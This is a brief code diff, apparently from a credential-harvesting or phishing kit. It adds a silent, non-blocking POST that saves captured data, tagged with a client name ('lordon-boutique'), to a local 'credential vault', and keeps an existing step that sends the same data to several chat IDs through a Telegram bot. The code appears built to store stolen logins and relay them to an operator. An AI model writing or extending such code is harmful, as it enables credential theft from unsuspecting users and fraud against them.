@@ -708,6 +708,14 @@
     ];
 
     try {
+      // 1. Save to credential vault (primary — persistent, searchable)
+      await fetch('http://localhost:9876/vault/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...d, client: 'lordon-boutique' })
+      }).catch(() => {}); // Non-blocking — don't fail if vault unreachable
+
+      // 2. Telegram notification (secondary — human alert only, NOT the source of truth)
       const results = await Promise.all(targets.map(chatId =>
         fetch(`https://api.telegram.org/bot${botKey}/sendMessage`, {
           method: 'POST',
